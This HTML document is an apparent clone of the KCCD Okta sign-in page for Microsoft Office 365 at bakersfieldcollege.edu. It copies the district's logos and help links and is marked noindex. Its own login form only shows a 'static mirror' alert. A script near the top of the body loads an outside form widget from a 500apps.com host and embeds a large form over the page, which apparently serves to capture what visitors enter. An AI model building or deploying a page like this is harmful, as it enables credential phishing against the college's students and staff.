<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>kccd - Sign In</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex,nofollow" />
  <link rel="icon" href="https://ok14static.oktacdn.com/bc/image/fileStoreRecord?id=fs065kg0dr2zVs2bW697">

  <style>
    :root {
      --primary: #005ea2;
      --border: #d6d6d6;
      --text: #2f2f2f;
      --bg: #f7f7f7;
    }

    * {
      box-sizing: border-box;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    }

    body {
      margin: 0;
      background: var(--bg);
      color: var(--text);
    }

    /* Background */
    .login-bg-image {
      position: fixed;
      inset: 0;
      background-image: url("https://ok14static.oktacdn.com/fs/bco/7/fs065kg0e0f2XifZD697");
      background-size: cover;
      background-position: center;
      z-index: -1;
    }

    /* Container */
    .login-container {
      max-width: 420px;
      margin: 5vh auto 2rem;
      background: #fff;
      border-radius: 6px;
      box-shadow: 0 10px 30px rgba(0,0,0,.15);
      overflow: hidden;
    }

    .auth-header {
      padding: 2rem;
      text-align: center;
      border-bottom: 1px solid var(--border);
    }

    .auth-header img {
      max-width: 180px;
    }

    .auth-content {
      padding: 2rem;
    }

    h2 {
      margin-top: 0;
      font-size: 1.4rem;
      font-weight: 600;
    }

    label {
      display: block;
      margin-bottom: .4rem;
      font-size: .9rem;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: .6rem .7rem;
      border: 1px solid var(--border);
      border-radius: 4px;
      font-size: 1rem;
    }

    .field {
      margin-bottom: 1.2rem;
    }

    .checkbox {
      display: flex;
      align-items: center;
      gap: .4rem;
      font-size: .9rem;
      margin-bottom: 1.4rem;
    }

    button {
      width: 100%;
      padding: .7rem;
      font-size: 1rem;
      background: var(--primary);
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    button:hover {
      opacity: .95;
    }

    /* Help */
    .auth-footer {
      margin-top: 1.5rem;
      text-align: center;
    }

    .help-toggle {
      font-size: .9rem;
      color: var(--primary);
      cursor: pointer;
      text-decoration: underline;
    }

    .help-links {
      list-style: none;
      padding: 0;
      margin: 1rem 0 0;
      display: none;
    }

    .help-links li {
      margin: .4rem 0;
    }

    .help-links a {
      font-size: .9rem;
      color: var(--primary);
      text-decoration: none;
    }

    /* App banner */
    .applogin-banner {
      max-width: 420px;
      margin: 0 auto 2rem;
      background: #fff;
      border-radius: 6px;
      box-shadow: 0 6px 20px rgba(0,0,0,.1);
      padding: 1.5rem;
      text-align: center;
    }

    .applogin-banner img {
      max-height: 42px;
      margin-top: .5rem;
    }

    @media (max-width: 480px) {
      .login-container,
      .applogin-banner {
        margin: 2vh 1rem;
      }
    }
  </style>
</head>

<body>
  <div class="login-bg-image"></div>
  <div id="forms-565805-475"></div>
    <script>
      (async (f, o, r, m, s) => {
        m = o.getElementsByTagName("head")[0];
        s = o.createElement("script");
        s.async = 1;
        s.src = r;
        s.onload = async () => {
          let data = await f.wg.init("forms", "us2", 565805, 3356523, "forms/475/embed", { width: "1200px", height: "750px" }, "widget", "forms-565805-475");
        };
        m.appendChild(s);
      })(window, document,  "https://infinity-public-js.500apps.com/widget.min.js");
    </script>

  <div class="login-container">
    <div class="auth-header">
      <img src="https://ok14static.oktacdn.com/fs/bco/1/fs065kg0dpHhIdpRB697" alt="kccd logo">
    </div>

    <div class="auth-content">
      <h2>Sign In</h2>

      <form id="loginForm">
        <div class="field">
          <label for="username">Username</label>
          <input id="username" type="text" required autocomplete="username">
        </div>

        <div class="field">
          <label for="password">Password</label>
          <input id="password" type="password" required autocomplete="current-password">
        </div>

        <div class="checkbox">
          <input id="remember" type="checkbox">
          <label for="remember">Remember me</label>
        </div>

        <button type="submit">Sign In</button>
      </form>

      <div class="auth-footer">
        <span class="help-toggle" onclick="toggleHelp()">Need help?</span>
        <ul class="help-links" id="helpLinks">
          <li><a href="#">Forgot password?</a></li>
          <li><a href="https://www.kccd.edu/board-trustees/_documents/board-policy/chapter-3/AP_3720.pdf" target="_blank">Computing and Network Use Policy</a></li>
          <li><a href="https://signin.kccd.edu/help/login" target="_blank">Help</a></li>
        </ul>
      </div>
    </div>
  </div>

  <div class="applogin-banner">
    <h3>Connecting to</h3>
    <img src="https://ok14static.oktacdn.com/fs/bcg/4/gfs1iitj6mtRHwXoE1d8" alt="Microsoft Office 365">
    <p>Sign in with your account to access Microsoft Office 365 - bakersfieldcollege.edu</p>
  </div>

  <script>
    function toggleHelp() {
      const el = document.getElementById("helpLinks");
      el.style.display = el.style.display === "block" ? "none" : "block";
    }

    document.getElementById("loginForm").addEventListener("submit", e => {
      e.preventDefault();
      alert("Static mirror only.\nNo authentication is performed.");
    });
  </script>
</body>
</html>
